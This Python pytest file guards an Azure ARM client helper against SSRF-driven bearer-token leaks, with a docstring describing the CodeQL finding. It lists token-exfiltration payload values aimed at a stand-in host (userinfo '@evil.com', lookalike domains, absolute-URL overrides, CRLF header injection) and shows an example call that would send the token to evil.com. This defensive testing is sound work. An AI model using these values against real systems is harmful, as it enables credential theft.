"""ARM bearer-token exfiltration via caller-controlled URL targets.

CodeQL reported eight `py/partial-ssrf` / `py/full-ssrf` alerts across the ARM helpers.
Six were the same underlying defect and it is NOT a false positive:

    # alerts_manager/service.py::test_action_group
    url = f"https://management.azure.com{action_group_id.rstrip('/')}/createNotifications"
    headers = {"Authorization": f"Bearer {token}", ...}

`action_group_id` is a request-body field carrying only `min_length=1, max_length=1000` --
no pattern, no allow-list, no lookup. It is interpolated at exactly the point where the
HOST is decided, and the request then attaches a live ARM access token. Verified against
httpx rather than reasoned about:

    "@evil.com/x"   -> host 'evil.com'                      (userinfo)
    ".evil.com/x"   -> host 'management.azure.com.evil.com' (a registrable domain)

The second route is `httpx`'s `base_url` merge. An absolute url does not get joined onto
`base_url`, it REPLACES it:

    Client(base_url="https://management.azure.com").build_request("GET", "https://evil.com/steal")
    -> https://evil.com/steal

so `arm_write(token, "GET", "https://evil.com/steal")` posts the token to evil.com. Both
`arm_write` and `arm_rest` took that value straight from their caller.

The endpoint is authenticated, so this is not anonymous -- it is a privilege escalation:
any caller who can reach the action-group test route walks away with the connection's ARM
token, which is scoped to the customer's whole subscription rather than to this product.
"""
from __future__ import annotations

import httpx
import pytest

from app.azure.arm import arm_path_error, arm_url_error

# Values verified to reach a non-ARM host through at least one of the two routes above.
HOST_MOVING_PATHS = [
    "@evil.com/x",
    ".evil.com/x",
    "https://evil.com/steal",
    "http://evil.com/steal",
    "\\@evil.com",
    "evil.com",
]

# Refused too, but on principle rather than on evidence: httpx currently collapses a
# protocol-relative path back onto base_url, so it does NOT escape today. It is rejected
# so that a future httpx (or a different client) cannot quietly make it escape. Kept in a
# separate list because asserting it "moves the host" would be a false claim.
DEFENSIVE_PATHS = ["//evil.com/steal"]


@pytest.mark.parametrize("value", HOST_MOVING_PATHS + DEFENSIVE_PATHS)
def test_host_moving_paths_are_refused(value):
    assert arm_path_error(value) is not None, f"accepted a host-moving path: {value!r}"


@pytest.mark.parametrize("value", HOST_MOVING_PATHS)
def test_those_paths_really_did_move_the_host(value):
    """Non-vacuity: without the guard, each value above reaches a host that is not ARM.

    If this ever stops passing, the parametrised cases have gone stale and the test above
    is no longer demonstrating anything.
    """
    concatenated = httpx.URL("https://management.azure.com" + value.rstrip("/") + "/x")
    merged = httpx.Client(base_url="https://management.azure.com").build_request("GET", value).url
    assert (concatenated.host or "").lower() != "management.azure.com" or (
        merged.host or ""
    ).lower() != "management.azure.com", (
        f"{value!r} no longer escapes management.azure.com by either route"
    )


def test_protocol_relative_path_is_currently_normalised_by_httpx():
    """Documents WHY `//evil.com/...` sits in DEFENSIVE_PATHS instead of the escape list.

    If this ever fails, httpx changed and the value became a real escape -- promote it.
    """
    merged = httpx.Client(base_url="https://management.azure.com").build_request(
        "GET", "//evil.com/steal"
    ).url
    assert (merged.host or "").lower() == "management.azure.com"


@pytest.mark.parametrize(
    "value",
    [
        "/subscriptions/00000000-0000-0000-0000-000000000000/resourceGroups/rg",
        "/subscriptions/x/providers/Microsoft.Insights/actionGroups/ag1",
        "/providers/Microsoft.Management/managementGroups",
        "/subscriptions/x/resourceGroups/rg with space".replace(" ", "%20"),
    ],
)
def test_real_arm_resource_ids_are_accepted(value):
    """The guard must not break the feature it protects."""
    assert arm_path_error(value) is None, f"rejected a legitimate ARM id: {value!r}"


@pytest.mark.parametrize(
    "value",
    ["/subs\r\nHost: evil.com", "/subs\nX: 1", "/subs\x00", "/subs cripti/ons", "/a\\b"],
)
def test_control_characters_and_backslash_are_refused(value):
    """CR/LF are request-splitting; backslash is folded to '/' by some parsers, not httpx."""
    assert arm_path_error(value) is not None


def test_empty_and_non_string_paths_are_refused():
    assert arm_path_error("") is not None
    assert arm_path_error(None) is not None  # type: ignore[arg-type]


@pytest.mark.parametrize(
    "value",
    [
        "https://management.azure.com@evil.com/x",  # userinfo, defeats a prefix check
        "https://management.azure.com.evil.com/x",  # registrable lookalike
        "https://evil.com/x",
        "http://management.azure.com/x",  # plaintext would expose the bearer token
        "not a url",
        "",
    ],
)
def test_arm_url_guard_refuses_non_arm_targets(value):
    assert arm_url_error(value) is not None, f"accepted a non-ARM url: {value!r}"


def test_arm_url_guard_accepts_the_real_plane():
    assert arm_url_error("https://management.azure.com/subscriptions/x?api-version=2021-04-01") is None


async def test_arm_write_refuses_without_issuing_a_request(monkeypatch):
    """The point is that the token never leaves the process, not just that it errors."""
    import app.azure.arm as arm

    def _explode(*_a, **_k):
        raise AssertionError("an HTTP request was issued for a refused target")

    monkeypatch.setattr(arm.httpx, "AsyncClient", _explode)

    data, error, status = await arm.arm_write("TOK", "GET", "https://evil.com/steal")
    assert data is None and status == 0
    assert "refused" in (error or "")


async def test_arm_rest_refuses_without_issuing_a_request(monkeypatch):
    import app.azure.arm as arm

    def _explode(*_a, **_k):
        raise AssertionError("an HTTP request was issued for a refused target")

    monkeypatch.setattr(arm.httpx, "AsyncClient", _explode)

    text, error = await arm.arm_rest("TOK", "POST", "https://management.azure.com@evil.com/x")
    assert text == ""
    assert "refused" in (error or "")


async def test_paged_collector_refuses_a_cross_host_nextlink():
    """nextLink is echoed from the response body and the token is re-sent on every hop."""
    from app.rbac import collectors

    calls: list[str] = []

    class _Resp:
        status_code = 200

        def __init__(self, url):
            self._url = url

        def json(self):
            # First page points the collector at another host.
            return {"value": [{"id": 1}], "nextLink": "https://evil.com/page2"}

    class _Client:
        async def __aenter__(self):
            return self

        async def __aexit__(self, *_a):
            return False

        async def get(self, url, **_k):
            calls.append(url)
            return _Resp(url)

    import app.rbac.collectors as mod

    original = mod.httpx.AsyncClient
    mod.httpx.AsyncClient = lambda *a, **k: _Client()  # type: ignore[assignment]
    try:
        out, error, _code = await collectors._get_all(
            "TOK", "https://management.azure.com/subscriptions/x/roleAssignments"
        )
    finally:
        mod.httpx.AsyncClient = original  # type: ignore[assignment]

    assert out == [{"id": 1}], "the first, legitimate page should still be returned"
    assert "refusing to follow nextLink" in (error or "")
    assert not any("evil.com" in c for c in calls), "the token was sent to the attacker host"
